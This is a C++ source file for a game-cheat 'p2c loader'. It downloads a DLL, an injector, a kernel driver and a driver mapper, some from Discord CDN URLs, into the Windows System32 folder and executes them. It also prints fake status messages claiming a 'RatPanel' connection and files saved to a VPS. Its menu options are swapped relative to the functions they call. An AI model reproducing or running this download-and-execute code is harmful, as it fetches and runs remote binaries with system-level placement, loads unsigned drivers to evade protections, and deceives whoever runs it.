

#include <iostream>
#include <string>
#include <tchar.h>
#include <string.h>
#include <urlmon.h>
#include <Windows.h>
#pragma comment (lib, "urlmon.lib")


void cheat()
{                  
    HRESULT ab = URLDownloadToFile(NULL, _T("your download link"), _T("C:/Windows/System32/yourdll.dll"), 0, NULL); 
                    
    HRESULT abc = URLDownloadToFile(NULL, _T("your download link"), _T("C:/Windows/System32/injector.exe"), 0, NULL);
    system("start C:/Windows/System32/injector.exe");
}
void drivers()
{                           
    HRESULT ab = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/887187511259045938/887473883643514910/Null.sys"), _T("C:/Windows/System32/dmas.sys"), 0, NULL);

    HRESULT abc = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/887187511259045938/887473877180121098/Mapper.exe"), _T("C:/Windows/System32/2prs.exe"), 0, NULL);
    system("start C:/Windows/System32/yourmapper.exe C:/Windows/System32/yourdriver.sys");
}
void loader()
{
    system("cls");
    SetConsoleTitleA("[+] p2c loader | coded by github.com/5nx"); 
    std::cout << " $> [1] Load Drivers\n\n $> [2] Load Cheat\n\n $> ur choice:\n";
    Sleep(100);
    int choice;

    std::cin >> choice;
    switch (choice)
    {
    case 1:
        cheat();
        break;
    case 2:
        drivers();
        break;
    }
}
int main()
{
    SetConsoleTitleA("[+] p2c loader | coded by github.com/5nx"); 
    system("color c");
    std::cout << "$> connecting..\n";
    Sleep(3000);
    std::cout << "$> connected\n";
    std::cout << "[+] serviceID: 000018F\n[>] driver entry: M9074888F\n[-] removing corrupted licenses...\n[+] Connected with 192.0.0.1\n[=] DB:db_damo1337;qee3920damo;1000;db_damo1337\n[>] RatPanel=READY\n[=] all offsets has been found! SUCCESS\n[+] 0x7499274F\n[+] Connected successfully!\n[>] surfacetexture-0-30619-2(0x731dbc000,id:2,api:1,p:388,c:30619) cancelBuffer: slot 1,DbgPrint\n";
    Sleep(100);
    std::cout << "$> loading sqlite..\n";
    Sleep(3000);
    std::cout << "$> loaded\n";
    std::cout << "[SQLite]\n Your license is active till: 29/09/2022\n  connected with damosql-vps\n";
    Sleep(100);
    std::cout << "$> initializing..\n";
    Sleep(3000);
    std::cout << "$> initialized\n";
    std::cout << "[RatPanel by chilli solutions]\n New connection received, saving files to VPS\n VPS info: 85.71.122.24;damovps1337\n";
    Sleep(100);
    std::cout << "$> welcome to p2c-loader coded & designed by damo#1337\n";
    Sleep(3000);
    std::cout << "github.com/5nx/p2c-loader\n";
    Sleep(10000);
    loader();
}


